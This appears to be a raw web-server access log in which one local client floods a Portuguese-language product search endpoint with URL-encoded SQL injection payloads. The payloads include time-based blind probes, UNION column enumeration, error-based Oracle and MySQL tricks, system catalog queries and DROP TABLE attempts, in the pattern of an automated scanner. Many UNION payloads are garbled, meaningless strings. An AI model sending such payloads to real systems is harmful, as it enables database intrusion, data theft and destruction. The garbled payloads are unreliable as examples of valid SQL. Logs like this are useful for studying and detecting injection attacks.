Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - GET /produtos/busca/?nome=-4746%25%22%29%29%29+or+5023%3Dctxsys.drithsx.sn%285023%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%285023%3D5023%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29+and+%28%28%28%22%25%22%3D%22&categoria=-4746%25%22%29%29%29+or+5023%3Dctxsys.drithsx.sn%285023%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%285023%3D5023%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29+and+%28%28%28%22%25%22%3D%22 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+where+8348+%3D+8348+and+elt+%28+4249+%3D+4249%2C7259+%29+--&categoria=1%27+%29+where+8348+%3D+8348+and+elt+%28+4249+%3D+4249%2C7259+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+where+2930+%3D+2930&categoria=1+%29+where+2930+%3D+2930 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-5191+where+2349%3D2349+or+9323%3D9323%23&categoria=-5191+where+2349%3D2349+or+9323%3D9323%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+as+tycq+where+8803+%3D+8800+or+4411+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+%29+%7C%7C%27&categoria=1%22+%29+as+tycq+where+8803+%3D+8800+or+4411+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+%29+%7C%7C%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+%29+or+6793+%3D+%28+select+6793+from+pg_sleep+%28+5+%29+%29+and+%28+%28+%28+%27ugrk%27+%3D+%27ugrk&categoria=1%27+%29+%29+%29+or+6793+%3D+%28+select+6793+from+pg_sleep+%28+5+%29+%29+and+%28+%28+%28+%27ugrk%27+%3D+%27ugrk HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-8029%27+in+boolean+mode+%29+union+all+select+7681%2C7681%2C7681%2C7681%2C7681%2C7681%2C7681%2C7681%23&categoria=-8029%27+in+boolean+mode+%29+union+all+select+7681%2C7681%2C7681%2C7681%2C7681%2C7681%2C7681%2C7681%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+OR+%271%27%3D%271%23+--&categoria=%27+OR+%271%27%3D%271%23+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+userschart%27lame+%28+to_+%29+%3C%26%26+%27w%27+not+like+%27wn%27+aND+true+OR+0x1e0%2F%2A%2A%2FnOt+LIKe+0o0X0B10010101+or+0&categoria=%27+UNION+SELECT+%40+%2C+userschart%27lame+%28+to_+%29+%3C%26%26+%27w%27+not+like+%27wn%27+aND+true+OR+0x1e0%2F%2A%2A%2FnOt+LIKe+0o0X0B10010101+or+0 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%40verscomand+3%29+LiKE+%273%27&categoria=%27+UNION+SELECT+%40%40verscomand+3%29+LiKE+%273%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Calecture%29+pyasinty%2C+it+in+like+%27istar%27+--&categoria=%27+UNION+SELECT+%40+%2C+users%2Calecture%29+pyasinty%2C+it+in+like+%27istar%27+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+tall_fale+sysion_selem_tu&categoria=%27+UNION+SELECT+%28+tall_fale+sysion_selem_tu HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verale+commanient+%28+DOMATURECS&categoria=%27+UNION+SELECT+%40+verale+commanient+%28+DOMATURECS HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%40verscolame+%29+FroM+sysibm.systables%3Bas+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3+and+%28+%28+%27btnl%27+%3D+%27btnl&categoria=%27+UNION+SELECT+%40%40verscolame+%29+FroM+sysibm.systables%3Bas+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3+and+%28+%28+%27btnl%27+%3D+%27btnl HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verale_tembent+table+tta&categoria=%27+UNION+SELECT+%40+verale_tembent+table+tta HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_Nibl_%2C+S%2C+1%2CvErsion+%28+%28+%29+%3B&categoria=%27+UNION+SELECT+%28+table_samerial%2Cname_Nibl_%2C+S%2C+1%2CvErsion+%28+%28+%29+%3B HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C%28u&categoria=%27+UNION+SELECT+%40+%2C%28u HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%40verscolame+%29+FroM+%28+SELECT+DISTINCT+%28+USErname+%29+%2C+rownum+aS+limIT+FROM+sys.alL_users+%29+WHErE+LIMIT+%3D+%28SELECT+0&categoria=%27+UNION+SELECT+%40%40verscolame+%29+FroM+%28+SELECT+DISTINCT+%28+USErname+%29+%2C+rownum+aS+limIT+FROM+sys.alL_users+%29+WHErE+LIMIT+%3D+%28SELECT+0 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verale+wert+temn_temsion%27ws+felt+in+the+infom+users+like+tule+tale+stomang+--&categoria=%27+UNION+SELECT+%40+verale+wert+temn_temsion%27ws+felt+in+the+infom+users+like+tule+tale+stomang+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28chars%29%3Bly+1%2C+%29&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28chars%29%3Bly+1%2C+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmateberpecaes_taee%3B+%29+%3B_A&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmateberpecaes_taee%3B+%29+%3B_A HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+table_name%27+%29+%3B+--&categoria=%27+UNION+SELECT+table_name%27+%29+%3B+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%40verscomand+3%29+LiKE+%273%27+ANd+%27i%27%21%3D%27I%27+--&categoria=%27+UNION+SELECT+%40%40verscomand+3%29+LiKE+%273%27+ANd+%27i%27%21%3D%27I%27+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cadechure+%29+%2C+%27slweap%27+like+%27a%27&categoria=%27+UNION+SELECT+%40+%2C+users%2Cadechure+%29+%2C+%27slweap%27+like+%27a%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+-+Table_name%2C+DiRLaG+Deap+%29+varserep+syveraged+never+beance+tabnabil&categoria=%27+UNION+SELECT+-+Table_name%2C+DiRLaG+Deap+%29+varserep+syveraged+never+beance+tabnabil HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_sameid%27%2C+select+version_ta&categoria=%27+UNION+SELECT+%28+table_sameid%27%2C+select+version_ta HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28chars+ly%24%3B%2Cly%2C+%29+%27%2F%2A%2A%2F&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28chars+ly%24%3B%2Cly%2C+%29+%27%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+table_name%27+%29+--&categoria=%27+UNION+SELECT+table_name%27+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28chars+ly%24%29%2C+licat+1+or+%27apvov%27+like+%27apcg&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28chars+ly%24%29%2C+licat+1+or+%27apvov%27+like+%27apcg HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_Nibl_%2C+vESIBMEN+%29+%29+%40NOT+--&categoria=%27+UNION+SELECT+%28+table_samerial%2Cname_Nibl_%2C+vESIBMEN+%29+%29+%40NOT+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%273%27&categoria=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%273%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Calecture+%29+%29+%2C+and+%27i%27+%3D+%27i&categoria=%27+UNION+SELECT+%40+%2C+users%2Calecture+%29+%29+%2C+and+%27i%27+%3D+%27i HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cadechare+%29+%3B%27tayt%27+%29+%3D+1+And+%271%27%3D%271&categoria=%27+UNION+SELECT+%40+%2C+users%2Cadechare+%29+%3B%27tayt%27+%29+%3D+1+And+%271%27%3D%271 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+tubl%2Csinchameachabelabeleaverib+%29+N+%28+an+%22ybe+%3D+selectefurerplypy%27%7C%7C%29&categoria=%27+UNION+SELECT+%28+tubl%2Csinchameachabelabeleaverib+%29+N+%28+an+%22ybe+%3D+selectefurerplypy%27%7C%7C%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%40verscolame%27%29+FROM+dual%27+--&categoria=%27+UNION+SELECT+%40%40verscolame%27%29+FROM+dual%27+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmacterabels_tabest_table+%29+%3B+AND+%271%27+Like+%271&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmacterabels_tabest_table+%29+%3B+AND+%271%27+Like+%271 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+Se&categoria=%27%3B+DROP+TABLE+Se HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+1+--&categoria=%27%3B+DROP+TABLE+1+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%22+OR+%221%22%3D%221%23%22+--&categoria=%22+OR+%221%22%3D%221%23%22+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+or+7427+%3D+dbms_pipe.receive_message+%28+chr+%28+116+%29+%7C%7Cchr+%28+87+%29+%7C%7Cchr+%28+90+%29+%7C%7Cchr+%28+109+%29+%2C5+%29+--&categoria=1%27+%29+%29+or+7427+%3D+dbms_pipe.receive_message+%28+chr+%28+116+%29+%7C%7Cchr+%28+87+%29+%7C%7Cchr+%28+90+%29+%7C%7Cchr+%28+109+%29+%2C5+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+as+xovu+where+4530+%3D+4530+or+4747+%3D+dbms_utility.sqlid_to_sqlhash+%28+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%7C%7C+%28+select+%28+case+when+%28+4747+%3D+4747+%29+then+1+else+0+end+%29+fro&categoria=1+%29+as+xovu+where+4530+%3D+4530+or+4747+%3D+dbms_utility.sqlid_to_sqlhash+%28+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%7C%7C+%28+select+%28+case+when+%28+4747+%3D+4747+%29+then+1+else+0+end+%29+fro HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+%29+and+elt+%28+9501+%3D+8427%2C8427+%29+and+%28+%28+%28+%27ahpp%27+%3D+%27ahpp+--&categoria=1%27+%29+%29+%29+and+elt+%28+9501+%3D+8427%2C8427+%29+and+%28+%28+%28+%27ahpp%27+%3D+%27ahpp+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=select+%28+case+when+%28+5430+%3D+7816+%29+then+5435+else+5435%2A+%28+select+5435+from+mysql.db+%29+end+%29+%23&categoria=select+%28+case+when+%28+5430+%3D+7816+%29+then+5435+else+5435%2A+%28+select+5435+from+mysql.db+%29+end+%29+%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+and+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+fzno+%29&categoria=1+%29+and+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+fzno+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%29+as+pogx+where+4105%3D4105+and+2853%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select+%28case+when+%282853%3D2853%29+then+1+else+0+end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29+as+numeric%29+--&categoria=1%27%29+as+pogx+where+4105%3D4105+and+2853%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select+%28case+when+%282853%3D2853%29+then+1+else+0+end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29+as+numeric%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+and+elt+%28+1210+%3D+1210%2Csleep+%28+5+%29+%29&categoria=1+%29+and+elt+%28+1210+%3D+1210%2Csleep+%28+5+%29+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%2B+%28+select+%27nhlx%27+where+2291+%3D+2291+or+%28+select+9173+from+%28+select+count+%28+%2A+%29+%2Cconcat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+9173+%3D+9173%2C1+%29+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+x+from+information_schem&categoria=1%27%2B+%28+select+%27nhlx%27+where+2291+%3D+2291+or+%28+select+9173+from+%28+select+count+%28+%2A+%29+%2Cconcat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+9173+%3D+9173%2C1+%29+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+x+from+information_schem HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+%29+rlike+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+sgvo+%29+and+%28+%28+%22grct%22+%3D+%22grct&categoria=1%22+%29+%29+rlike+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+sgvo+%29+and+%28+%28+%22grct%22+%3D+%22grct HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+as+bzuh+where+8041+%3D+8041+and+6307+%3D+9200%23&categoria=1+%29+as+bzuh+where+8041+%3D+8041+and+6307+%3D+9200%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+as+wshv+where+5684+%3D+5684&categoria=1+%29+as+wshv+where+5684+%3D+5684 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=0b0B1+%29+oR+%2AslEeP+%28+0O0b0o0O0o0o5O0B110+%29+and+%28+%28+%28+%27YfOk%27+lIKe+%27FYok&categoria=0b0B1+%29+oR+%2AslEeP+%28+0O0b0o0O0o0o5O0B110+%29+and+%28+%28+%28+%27YfOk%27+lIKe+%27FYok HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+as+ssxj+where+3845+%3D+3845+or+7427+%3D+dbms_pipe.receive_message+%28+chr+%28+116+%29+%7C%7Cchr+%28+87+%29+%7C%7Cchr+%28+90+%29+%7C%7Cchr+%28+109+%29+%2C5+%29+--&categoria=1%27+%29+as+ssxj+where+3845+%3D+3845+or+7427+%3D+dbms_pipe.receive_message+%28+chr+%28+116+%29+%7C%7Cchr+%28+87+%29+%7C%7Cchr+%28+90+%29+%7C%7Cchr+%28+109+%29+%2C5+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%25%27+%29+%29+%29+and+6414+%3D+%28+select+count+%28+%2A+%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+%29+and+%28+%28+%28+%27%25%27+%3D+%27&categoria=1%25%27+%29+%29+%29+and+6414+%3D+%28+select+count+%28+%2A+%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+%29+and+%28+%28+%28+%27%25%27+%3D+%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%2B+%28+select+%27mtpt%27+where+7483+%3D+7483+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+--&categoria=1%27%2B+%28+select+%27mtpt%27+where+7483+%3D+7483+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+where+9583+%3D+9583+and+5319+%3D+7670%23&categoria=1%27+where+9583+%3D+9583+and+5319+%3D+7670%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22%29%29+and+6240%3D%28%27qqpjq%27%7C%7C%28select+case+6240+when+6240+then+1+else+0+end+from+rdb%24database%29%7C%7C%27qzvzq%27%29+and+%28%28%22mjkl%22%3D%22mjkl&categoria=1%22%29%29+and+6240%3D%28%27qqpjq%27%7C%7C%28select+case+6240+when+6240+then+1+else+0+end+from+rdb%24database%29%7C%7C%27qzvzq%27%29+and+%28%28%22mjkl%22%3D%22mjkl HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%29%29+as+ypgz+where+8704%3D8704%3Bselect+count%28%2A%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+--&categoria=1%27%29%29+as+ypgz+where+8704%3D8704%3Bselect+count%28%2A%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+and+6414+%3D+%28+select+count+%28+%2A+%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+%29+and+%28+%27gcna%27+%3D+%27gcna&categoria=1%27+%29+and+6414+%3D+%28+select+count+%28+%2A+%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+%29+and+%28+%27gcna%27+%3D+%27gcna HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-9581+%29+as+jkqo+where+5200+%3D+5200+or+6872+%3D+6872+--&categoria=-9581+%29+as+jkqo+where+5200+%3D+5200+or+6872+%3D+6872+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%7C%7C+%28+select+%27eauf%27+where+5431+%3D+5431+and+sleep+%28+5+%29+%23&categoria=1%27%7C%7C+%28+select+%27eauf%27+where+5431+%3D+5431+and+sleep+%28+5+%29+%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+where+9226+%3D+9226+and+9660+%3D+%28+select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+%29+--&categoria=1%27+%29+where+9226+%3D+9226+and+9660+%3D+%28+select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-7307%27+%29+%29+union+all+select+5215%2C5215%2C5215%2C5215+--&categoria=-7307%27+%29+%29+union+all+select+5215%2C5215%2C5215%2C5215+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+and+6414+%3D+%28+select+count+%28+%2A+%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+%29+and+%28+%28+%27ykoz%27+%3D+%27ykoz&categoria=1%27+%29+%29+and+6414+%3D+%28+select+count+%28+%2A+%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+%29+and+%28+%28+%27ykoz%27+%3D+%27ykoz HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+or+sleep+%28+5+%29+%23&categoria=1+%29+or+sleep+%28+5+%29+%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-2344+%29+as+gizm+where+2485+%3D+2845+or+4747+%3D+dbms_utility.sqlid_to_sqlhash+%28+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%7C%7C+%28+select+%28+case+when+%28+4747+%3D+4747+%29+then+1+else+0+end+%29&categoria=-2344+%29+as+gizm+where+2485+%3D+2845+or+4747+%3D+dbms_utility.sqlid_to_sqlhash+%28+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%7C%7C+%28+select+%28+case+when+%28+4747+%3D+4747+%29+then+1+else+0+end+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%25%22+and+4595+%3D+4595%23&categoria=1%25%22+and+4595+%3D+4595%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=select+%2A+from+users+where+id+%3D+1+or+%22+%28+.%22+or+1+%3D+1+--+1&categoria=select+%2A+from+users+where+id+%3D+1+or+%22+%28+.%22+or+1+%3D+1+--+1 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=0O0O0o0O0O1%27+%29+%29+Or+%28seLECt+0x2E0x2%29+lIKe%3F+dbMS_pIpe.rEcEIVE_MEssAgE+%28+ChR+%28+0X0x0O0x7C+%29+or+chr+%28+%28selECt+%28Select+%28seLecT+0x3c%29%29%29+%29+Or+chr+%28+%28SELeCT+%28SeLEcT+%28SELECT+%28SELECT+%28SELECT+45%29%29%29%29%29+%29+Or+chR+%28+0O1336+%29+%2C%28SELeCT+%28S&categoria=0O0O0o0O0O1%27+%29+%29+Or+%28seLECt+0x2E0x2%29+lIKe%3F+dbMS_pIpe.rEcEIVE_MEssAgE+%28+ChR+%28+0X0x0O0x7C+%29+or+chr+%28+%28selECt+%28Select+%28seLecT+0x3c%29%29%29+%29+Or+chr+%28+%28SELeCT+%28SeLEcT+%28SELECT+%28SELECT+%28SELECT+45%29%29%29%29%29+%29+Or+chR+%28+0O1336+%29+%2C%28SELeCT+%28S HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+as+tygi+where+9891+%3D+9891+and+row+%28+6237%2C7469+%29+%3E+%28+select+count+%28+%2A+%29+%2Cconcat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+6237+%3D+6237%2C1+%29+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+x+from+%28+select+5192+union+select+3785+union+select+3931+union+selec&categoria=1%27+%29+as+tygi+where+9891+%3D+9891+and+row+%28+6237%2C7469+%29+%3E+%28+select+count+%28+%2A+%29+%2Cconcat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+6237+%3D+6237%2C1+%29+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+x+from+%28+select+5192+union+select+3785+union+select+3931+union+selec HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%2B+%28+select+%27kiqf%27+where+5920+%3D+5920&categoria=1%27%2B+%28+select+%27kiqf%27+where+5920+%3D+5920 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%25%22%29%29%29+and+2853%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select+%28case+when+%282853%3D2853%29+then+1+else+0+end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29+as+numeric%29+and+%28%28%28%22%25%22%3D%22&categoria=1%25%22%29%29%29+and+2853%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select+%28case+when+%282853%3D2853%29+then+1+else+0+end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29+as+numeric%29+and+%28%28%28%22%25%22%3D%22 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=0b0o7%27%2B+%60%28+SElect+%27sbji%27+whEre+0x9o9d5f+LiKe+%28SeLecT+%28seLeCt+%28SELect+%28SELECT+%28SELECT+5455%29%29%29%29%29+AnD+CHar+%28+%28sELeCt+0o123%29+%29+Or+CHAR+%28+%28SEleCt+%28SeLecT+0xbd%29%29+%29+OR+cHAR+%28+%28SELEct+%28select+%28seleCT+%28sElecT+%28sELECt+%28SELECT+%28SELECT+67%29%29%29%29%29%29%29+%29+O&categoria=0b0o7%27%2B+%60%28+SElect+%27sbji%27+whEre+0x9o9d5f+LiKe+%28SeLecT+%28seLeCt+%28SELect+%28SELECT+%28SELECT+5455%29%29%29%29%29+AnD+CHar+%28+%28sELeCt+0o123%29+%29+Or+CHAR+%28+%28SEleCt+%28SeLecT+0xbd%29%29+%29+OR+cHAR+%28+%28SELEct+%28select+%28seleCT+%28sElecT+%28sELECt+%28SELECT+%28SELECT+67%29%29%29%29%29%29%29+%29+O HTTP/1.1
